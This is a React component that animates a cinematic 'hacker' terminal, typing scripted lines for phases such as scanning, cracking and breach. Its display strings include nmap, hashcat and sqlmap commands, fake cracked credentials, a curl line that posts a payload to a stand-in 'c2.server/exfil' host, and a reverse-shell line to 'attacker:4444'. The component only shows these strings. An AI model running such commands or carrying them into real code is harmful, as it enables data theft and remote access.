"use client";

import { useEffect, useState, useRef } from "react";
import { motion } from "framer-motion";
import styles from "./CodeTerminal.module.css";

/**
 * CodeTerminal Component
 * 
 * Realistic terminal with syntax-highlighted code snippets,
 * auto-typing animation, and dramatic visual effects.
 */

interface CodeTerminalProps {
    phase: "initializing" | "scanning" | "cracking" | "extracting" | "breach" | "complete";
    className?: string;
}

// Code snippets for different phases
const CODE_SNIPPETS: Record<string, string[]> = {
    initializing: [
        "$ ./exploit --target 192.168.1.x",
        "if (GROUP_INFO) {",
        "  NBLOCKS = NBLOCKS ? : 1;",
        "  GROUP_INFO = KMALLOC(SIZEOF(*GROUP_INFO) + NBLOCKS*SIZEOF(GID_T *), GFP_",
        "  if (!GROUP_INFO)",
        "    return NULL;",
        "}",
    ],
    scanning: [
        "GROUP_INFO->NGROUPS = GIDSETSIZE;",
        "GROUP_INFO->NBLOCKS = NBLOCKS;ATOMIC_SET(&GROUP_INFO->USAGE, 1);IF (GIDS",
        "nmap -sS -sV -O 192.168.1.0/24",
        "PORT     STATE  SERVICE    VERSION",
        "22/tcp   open   ssh        OpenSSH 7.4",
        "80/tcp   open   http       Apache 2.4.6",
        "443/tcp  open   https      nginx 1.12.2",
    ],
    cracking: [
        "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
        "[*] Cracking NTLM hash...",
        "[+] Found: admin:P@ssw0rd123!",
        "sqlmap -u 'http://target.com/id=1' --dbs",
        "[*] Extracting database schemas...",
        "[+] DATABASE: users, orders, credentials",
    ],
    extracting: [
        "SELECT * FROM users WHERE admin=1;",
        "| id | username | password_hash    | email              |",
        "| 1  | admin    | 5f4dcc3b5aa765   | admin@target.com   |",
        "| 2  | dbadmin  | d8578edf8458ce   | db@target.com      |",
        "curl -X POST -d @payload.json https://c2.server/exfil",
        "[+] Data exfiltration complete: 2.4MB transferred",
    ],
    breach: [
        "!!! CRITICAL ACCESS OBTAINED !!!",
        "[+] Root shell spawned",
        "[+] Persistence mechanism installed",
        "[+] Firewall rules modified",
        "[+] Full system compromise achieved",
        "reverse_shell -> attacker:4444",
    ],
    complete: [
        "=================================",
        "   SYSTEM FULLY COMPROMISED",
        "=================================",
        "[+] Session established",
        "[+] Awaiting commands...",
        "root@target:~#",
    ],
};

export function CodeTerminal({ phase, className = "" }: CodeTerminalProps) {
    const [displayedLines, setDisplayedLines] = useState<string[]>([]);
    const [currentLineIndex, setCurrentLineIndex] = useState(0);
    const [currentCharIndex, setCurrentCharIndex] = useState(0);
    const [isTyping, setIsTyping] = useState(true);
    const containerRef = useRef<HTMLDivElement>(null);

    // Get current code snippets based on phase
    const codeSnippets = CODE_SNIPPETS[phase] || CODE_SNIPPETS.initializing;

    // Reset when phase changes
    useEffect(() => {
        setDisplayedLines([]);
        setCurrentLineIndex(0);
        setCurrentCharIndex(0);
        setIsTyping(true);
    }, [phase]);

    // Typing animation
    useEffect(() => {
        if (!isTyping) return;

        const currentLine = codeSnippets[currentLineIndex];
        if (!currentLine) {
            setIsTyping(false);
            return;
        }

        if (currentCharIndex < currentLine.length) {
            // Type next character
            const timeout = setTimeout(() => {
                setCurrentCharIndex(prev => prev + 1);
            }, 15 + Math.random() * 25); // Variable typing speed for realism

            return () => clearTimeout(timeout);
        } else {
            // Line complete, move to next line
            setDisplayedLines(prev => [...prev, currentLine]);

            if (currentLineIndex < codeSnippets.length - 1) {
                const timeout = setTimeout(() => {
                    setCurrentLineIndex(prev => prev + 1);
                    setCurrentCharIndex(0);
                }, 100 + Math.random() * 200);

                return () => clearTimeout(timeout);
            } else {
                setIsTyping(false);
            }
        }
    }, [currentCharIndex, currentLineIndex, codeSnippets, isTyping]);

    // Auto-scroll to bottom
    useEffect(() => {
        if (containerRef.current) {
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [displayedLines, currentCharIndex]);

    // Syntax highlighting helper
    const highlightSyntax = (line: string) => {
        // Keywords
        let highlighted = line
            .replace(/\b(if|return|for|while|SELECT|FROM|WHERE|INSERT|UPDATE)\b/g, '<span class="keyword">$1</span>')
            // Strings
            .replace(/(["'])(.*?)\1/g, '<span class="string">$1$2$1</span>')
            // Numbers
            .replace(/\b(\d+(\.\d+)?)\b/g, '<span class="number">$1</span>')
            // Comments and special markers
            .replace(/(\[\+\]|\[\*\]|\[!\])/g, '<span class="marker">$1</span>')
            // Paths and IPs
            .replace(/(\/[\w./]+|\d+\.\d+\.\d+\.\d+)/g, '<span class="path">$1</span>')
            // Success indicators
            .replace(/(SUCCESS|COMPLETE|OBTAINED|Found:|COMPROMISED)/g, '<span class="success">$1</span>')
            // Error indicators
            .replace(/(ERROR|FAILED|CRITICAL|!!!)/g, '<span class="error">$1</span>');

        return highlighted;
    };

    const currentLine = codeSnippets[currentLineIndex];
    const partialLine = currentLine ? currentLine.slice(0, currentCharIndex) : "";

    return (
        <div className={`${styles.container} ${className}`}>
            {/* Terminal Header */}
            <div className={styles.header}>
                <div className={styles.dots}>
                    <span className={styles.dotRed} />
                    <span className={styles.dotYellow} />
                    <span className={styles.dotGreen} />
                </div>
                <span className={styles.title}>EXPLOIT_TERMINAL</span>
                <span className={styles.status}>
                    {isTyping ? "ACTIVE" : "READY"}
                </span>
            </div>

            {/* Terminal Content */}
            <div className={styles.content} ref={containerRef}>
                {/* Completed lines */}
                {displayedLines.map((line, index) => (
                    <motion.div
                        key={index}
                        className={styles.line}
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ duration: 0.1 }}
                    >
                        <span className={styles.lineNumber}>{String(index + 1).padStart(2, '0')}</span>
                        <span
                            className={styles.code}
                            dangerouslySetInnerHTML={{ __html: highlightSyntax(line) }}
                        />
                    </motion.div>
                ))}

                {/* Currently typing line */}
                {isTyping && currentLine && (
                    <div className={styles.line}>
                        <span className={styles.lineNumber}>
                            {String(displayedLines.length + 1).padStart(2, '0')}
                        </span>
                        <span
                            className={styles.code}
                            dangerouslySetInnerHTML={{ __html: highlightSyntax(partialLine) }}
                        />
                        <span className={styles.cursor}>▋</span>
                    </div>
                )}

                {/* Blinking cursor when idle */}
                {!isTyping && (
                    <div className={styles.line}>
                        <span className={styles.lineNumber}>
                            {String(displayedLines.length + 1).padStart(2, '0')}
                        </span>
                        <span className={styles.prompt}>{">"}</span>
                        <span className={styles.cursor}>▋</span>
                    </div>
                )}
            </div>
        </div>
    );
}

export default CodeTerminal;
